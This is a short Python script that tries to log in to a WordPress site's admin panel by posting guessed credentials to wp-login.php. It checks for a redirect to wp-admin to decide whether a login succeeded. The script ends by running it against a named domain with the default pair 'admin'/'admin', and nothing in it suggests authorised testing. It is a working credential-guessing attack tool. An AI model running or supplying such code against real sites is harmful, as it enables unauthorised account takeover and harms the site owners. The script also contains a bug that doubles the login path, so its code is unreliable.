import requests

def brute(url, username, password):
    global ispwned
    login_url = f'{url}/wp-login.php'
    session = requests.session()

    cookies = {
        'wordpress_test_cookie':'WP+Cookie+check'
    }

    try:
        response = session.post(login_url, data={'log': username, 'pwd': password, 'redirect_to': '/wp-admin/', 'wp-submit': 'Log In', 'testcookie': 1},
                                cookies=cookies, timeout=15)
    except:
        return None
    if 'Blocked by login security setting' in response.text:
        return None
    elif 'wp-admin' in response.url:
        if('redirect_to' in response.url):
            return False
        print(response.url)
        return True
    else:
        return False

brute("http://gaspardgraulich.com/wp-login.php","admin","admin")